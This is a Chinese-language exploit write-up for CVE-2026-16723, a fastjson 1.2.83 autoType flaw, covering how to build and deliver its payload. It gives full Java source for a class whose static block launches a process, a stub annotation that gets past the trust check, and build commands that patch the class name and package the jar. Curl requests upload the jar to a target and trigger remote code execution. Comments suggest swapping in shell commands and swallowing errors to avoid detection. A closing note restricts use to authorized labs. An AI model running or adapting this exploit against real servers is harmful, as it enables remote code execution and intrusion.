---
title: CVE-2026-16723：载荷（payload）构造
date: 2026-11-11
description: 关于payload的相关解释，学会怎么构造payload
---

# CVE-2026-16723：载荷（payload）构造

> 配套文档：`SOURCE.md`（fastjson 1.2.83 源码注解）。本文件只讲载荷本身。
> 实测环境：Spring Boot fat-JAR + fastjson 1.2.83，JDK 8u66；载荷 class 585 字节，jar 533 字节。

---

## 1. 载荷是什么

一个**自己写的 Java 类**，装进 jar，落到目标磁盘上。攻击者发的那条 JSON 里只有一段路径，没有代码：

```json
{"@type":"jar:file:.C:.fj.uploads.p!.Evil"}
```

真正被执行的字节，全部在那个文件里。这是本漏洞和传统反序列化最大的不同——**武器不随请求走**。

原因（`SOURCE.md` 6.4 有细节）：远程 `jar:http://` 形态走不到 `defineClass`，点号还原后类名里会出现 `//`，JVM 直接 `ClassFormatError`。所以必须先落地，再触发。

---

## 2. 载荷源码（带注解）

```java
// ===========================================================================
// CVE-2026-16723  最小载荷（逐行注解版）
// 编译：javac --release 8 -nowarn -d classes Evil.java JSONType.java
// 硬性要求：字节码版本必须是 52（Java 8），不要用 --release 11 及以上
// ===========================================================================

import com.alibaba.fastjson.annotation.JSONType;

/**
 * 这个类没有 main 方法，也不会被任何人 new 出来用。
 * 它整条生命周期的驱动力都来自 fastjson：
 *
 *   读字节  ->  ParserConfig.java:1484  getResourceAsStream(resource)
 *   判可信  ->  ParserConfig.java:1492  visitor.hasJsonType()
 *   定义类  ->  TypeUtils.java:1761     defineClass(name, bytes, 0, len)
 *   初始化  ->  JVM 在"首次主动使用"时执行 <clinit>
 *
 * 承重结构只有三处，其中两处在源码里、一处在字节里：
 *   [1] 类级注解 @JSONType   -> 让 TypeCollector 把 jsonType 置为 true      （源码里）
 *   [2] static { } 静态块    -> 让 JVM 在类初始化时自动执行                  （源码里）
 *   [3] this_class 类名      -> 让 defineClass 的命名校验通过                （字节里，脚本改写）
 *
 * 缺任何一处，链条都会断在某一环。
 */
@JSONType
public class Evil {

    static {
        // <clinit>：JVM 在初始化这个类时执行，早于任何构造方法。
        // fastjson 拿到 Class 之后会立刻实例化，所以这一段必然被触发；
        // 反过来，即使目标类没有无参构造、后续反序列化抛错，静态块也已经跑完了。
        // 这就是把恶意逻辑放静态块、而不是放构造方法的原因。
        try {
            // RCE 的全部内容：一次普通的进程创建调用。
            // 没有任何 fastjson API，没有任何反射，JDK 自带即可。
            // 换成 "cmd.exe /c whoami"、"/bin/sh -c id" 效果相同。
            new ProcessBuilder("calc.exe").start();
        } catch (Exception ignored) {
            // 真实攻击里也会吞掉异常：不让目标日志留下堆栈，减少被发现的机会。
            // 顺带一提，fastjson 自己也是这么干的（ParserConfig 1494 行 catch 后什么都不记）。
        }
    }
}
```

三个容易看漏的点：

1. **没有 `main`，没有 `new`，没有反射。** 类被初始化即执行，这是 JVM 语义，不是技巧。
2. **`static` 块优先于构造方法。** 即使后续实例化失败，静态块也已经跑完。
3. **`catch` 是空的。** 真实攻击不希望目标日志出现堆栈。

---

## 3. 桩注解（证明判定只看字符串）

```java
// ===========================================================================
// 桩注解：故意做成空实现，用来证明 fastjson 的信任判定不看"实现"，只看"字符串"
//
//   TypeCollector.java:10
//       private static String JSONType =
//           ASMUtils.desc(com.alibaba.fastjson.annotation.JSONType.class);
//   展开就是常量 "Lcom/alibaba/fastjson/annotation/JSONType;"，
//   判定逻辑（TypeCollector.java:71）只做一次字符串比较。
// ===========================================================================

package com.alibaba.fastjson.annotation;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * 真实的 fastjson @JSONType 有很多属性（orders、serializeFeatures 等）。
 * 这里一个都不需要：判定只看注解的名字，不看内容。
 *
 * RUNTIME 是必需的：只有运行时可见的注解才会进入 class 文件的
 * RuntimeVisibleAnnotations 属性，而 TypeCollector 读的正是这一个。
 * 如果写成 CLASS 或 SOURCE，字节里就不会有它，fastjson 也看不到。
 */
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.TYPE)   // 必须是类级注解，TypeCollector 只处理类级注解表
public @interface JSONType {
}
```

**实测证据**：打出来的 jar 里只有 `Evil.class` 一个条目，注解类根本没打包，照样执行成功。因为运行时它不会被加载，只以 42 字节描述符的形式存在。

---

## 4. 构建（四条命令）

```bash
# 1. 编译成 Java 8 字节码（class 版本 52）
javac --release 8 -nowarn -d classes Evil.java JSONType.java

# 2. 改写 this_class。这一串必须等于「@type 把点号还原后、去掉 .class」的结果
python patch_name.py classes/Evil.class 'jar:file:/C:/fj/uploads/p!/Evil' classes/Evil.class

# 3. 打包。条目名必须是根目录的 Evil.class，且只需要这一个文件
python -c "import zipfile;z=zipfile.ZipFile('payload.jar','w',zipfile.ZIP_DEFLATED);z.write('classes/Evil.class','Evil.class');z.close()"

# 4. 校验（两行预期输出）
javap -v -p classes/Evil.class | grep -E "major version|this_class"
#   major version: 52
#   this_class: #22    // "jar:file:/C:/fj/uploads/p!/Evil"
```

用 python 打包而不用 `jar` 命令，原因有两个：`jar` 21 不允许短于 3 字符的文件名；以及需要精确控制条目名（必须是 `Evil.class`，不能是 `classes/Evil.class`）。

参数化版本（换名字、换路径、换命令）：

```bash
NAME=q bash build.sh                 # 换类名 → 换落盘文件名，绕开类缓存
TARGET=/tmp/x NAME=f bash build.sh   # Linux 靶机
CMD=notepad.exe bash build.sh        # 换执行的命令
```

`NAME` 会同时改两处，必须一致：jar 在磁盘上的文件名、以及 class 的 `this_class`。因为 1482 行用同一个字符串拼资源路径，1761 行用同一个字符串做类名。

---

## 5. 载荷的三处承重

| 处 | 内容 | 被哪一行消费 | 删掉的后果 |
|---|---|---|---|
| `@JSONType` 注解 | 常量池里 42 字节描述符 | `TypeCollector.java:71` 置 `jsonType=true` | `jsonType=false` → `ParserConfig:1542` 抛 `autoType is not support` |
| `this_class` | `jar:file:/C:/fj/uploads/p!/Evil` | `TypeUtils.java:1761` → `defineClass` | `NoClassDefFoundError ... (wrong name: Evil)` |
| `static {}` | 静态块里的 `calc.exe` | JVM 初始化类时执行 `<clinit>` | 类加载成功，无任何效果 |
| jar 条目名 | 根目录的 `Evil.class` | `ParserConfig:1482` 拼出的路径 | `stream=false`，`bytes=0` |

除此之外全是 JVM 必需结构：魔数、版本号、常量池、方法表。

实测偏移（585 字节版本）：

```text
0x073   calc.exe                                          8 字节
0x0E7   jar:file:/C:/fj/uploads/p!/Evil                  31 字节
0x172   Lcom/alibaba/fastjson/annotation/JSONType;       42 字节
```

> 偏移随常量池变化，抓的是"这三样东西存在"，不是固定位置。用 `javap -v -p` 或直接搜字节串都能定位。

---

## 6. 投递与触发

```bash
# 1. 投递：让 jar 落到目标磁盘（靶场的 /upload 模拟真实业务的上传功能）
curl -s -X POST "http://127.0.0.1:18084/upload?name=p" \
     -H 'Content-Type: application/octet-stream' \
     --data-binary @payload.jar

# 2. 探测：只读字节、识别注解，不执行
curl -s -G "http://127.0.0.1:18084/debug" \
     --data-urlencode 'type=jar:file:.C:.fj.uploads.p!.Evil'

# 3. 触发
curl -s -m 20 -X POST "http://127.0.0.1:18084/parse" \
     -H 'Content-Type: application/json' \
     -d '{"@type":"jar:file:.C:.fj.uploads.p!.Evil"}'
```

判定看三层，**不要只看返回体**：

| 层 | 命令 / 现象 | 说明 |
|---|---|---|
| 连通 | `exit=0` | 命令本身没出错 |
| 探测 | `stream:true`、`bytes:585`、`jsonTypeDirect:true` | 字节读到了、注解被识别 |
| 副作用 | 计算器进程出现、证明文件 mtime 变化 | **唯一不会骗人的判据** |

`ok:true` 只代表"类存在、实例创建成功"，不等于"代码刚执行过"。

---

## 7. 五个硬约束

1. **字节码版本必须是 52。** 用 `--release 8`；`--release 11` 起在 JDK 8 目标上会 `UnsupportedClassVersionError`。
2. **jar 条目名必须是根目录的 `Evil.class`。** 1482 行拼的是 `typeName 还原 + ".class"`，多一层目录就对不上。
3. **`@type` 里除了协议头冒号，全部用点号。**
   - 正确：`jar:file:.C:.fj.uploads.p!.Evil`
   - 错误：`jar:file:.C:.fj.uploads.p!/Evil`（`checkAutoType` 判成不可解析）
4. **`this_class` 必须等于 `@type` 还原后的类名**（去掉 `.class`），逐字相同。
5. **同一个类名只能执行一次。** 第二次命中 `TypeUtils:1744` 缓存，`ok:true` 但静态块不再跑。换名字或重启靶机。

---

## 8. 边界

自有靶场、授权范围内使用。本文载荷只启动一个计算器并写一个证明文件，不含反弹 shell、不含持久化、不修改系统配置。对外分享时保持同样口径。
